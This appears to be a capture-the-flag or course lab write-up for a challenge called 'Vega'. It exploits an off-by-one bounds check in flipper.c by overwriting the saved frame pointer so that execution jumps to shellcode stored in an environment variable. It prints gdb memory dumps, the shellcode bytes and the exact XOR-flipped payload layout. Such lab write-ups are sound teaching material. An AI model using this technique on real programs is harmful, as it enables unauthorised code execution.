# 01 - Vega Writeup

## Main Idea

The code is vulnerable the boardary check in flip in off by one, It should be less than 64, however, the boardary check in code is less and equal than 64. This can lead to a off-by-one attack.

There is a clever methods to bypass the check of RIP. At first, we use the address of shellcode to fill in all the buffer. And then use the off-by-one attack to overwrite the SFP. At second, the function will return rightly, but the SFP is tampered. Next, the tampered SFP will impact RIP of function in the next call. Since the whole buffer is filled with address of shellcode, we will return to the SHELLCODE.

Don't forget to flip the output of args according to the `flipper.c`.

## address of shellcode

Firstly, we need to find the location of SHELLCODE (), which is in the environment variable. So we know the shellcode begins with `0xcd58326a`, thus the magic number is `0xffffdf9c`

``` c++
(gdb) p environ[0]
$1 = 0xffffd801 "SHLVL=1"
(gdb) p environ[1]
$2 = 0xffffd809 "PAD=", '\377' <repeats 196 times>...
(gdb) p environ[2]
$3 = 0xffffdf7e "TERM=screen"
(gdb) p environ[3]
$4 = 0xffffdf8a "SHELL=/bin/sh"
(gdb) p environ[4]
$5 = 0xffffdf98 "EGG=j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/b
in\211\343PRQS\211\341\061Ұ\v̀"
(gdb) x/16x environ[4]
0xffffdf98:     0x3d474745      0xcd58326a      0x89c38980      0x58476ac1
0xffffdfa8:     0xc03180cd      0x692d6850      0xe2896969      0x6d2b6850      
0xffffdfb8:     0xe1896d6d      0x2f2f6850      0x2f686873      0x896e6962      
0xffffdfc8:     0x515250e3      0x31e18953      0xcd0bb0d2      0x57500080 
```

## address of return address (RIP)

We can get RIP by `info frame`, which is `0xfffd614`
(gdb) i f

``` c++
Stack level 0, frame at 0xffffd618:
 eip = 0x8049260 in invoke (flipper.c:20); saved eip = 0x804927a
 called by frame at 0xffffd608
 source language c.
 Arglist at 0xffffd610, args:
    in=0xffffd7bf "\274\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337\337 "
 Locals at 0xffffd610, Previous frame's sp is 0xffffd618
 Saved registers:
  ebp at 0xffffd610, eip at 0xffffd614
```

## address of buf

We can get the address of buf by `print &buf`, which is `0xffffd5d0`

```C++
(gdb) p &buf
$6 = (char (*)[64]) 0xffffd5d0
```

## the stack before attack

```c++
(gdb) x/20x buf
0xffffd5d0:     0x00000000      0x00000001      0x00000000      0xffffd78b
0xffffd5e0:     0x00000002      0x00000000      0x00000000      0x00000000
0xffffd5f0:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
0xffffd600:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd610:     0xffffd61c      0x0804927a      0xffffd7bf      0xffffd628
```

## the stack after attack

note that the SFP is tampered to 0xfffd600, the new RIP will be the SFP + 4 = 0xfffd604

```C++
(gdb) x/20x buf
0xffffd5d0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
0xffffd5e0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
0xffffd5f0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
0xffffd600:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
0xffffd610:     0xffffd600      0x0804927a      0xffffd7bf      0xffffd628
```

## EGG output

Thus the output of arg will be  `52 * "A" + "\x9c\xdf\xff\xff" + 8 * "A" + "\x00"` xor `\x20`

`52 for pad` + `4 for the address of shellcode` + `8 for pad` + `\x00 for tamper the SFP`

Don't forget to flip the output with 0x20.
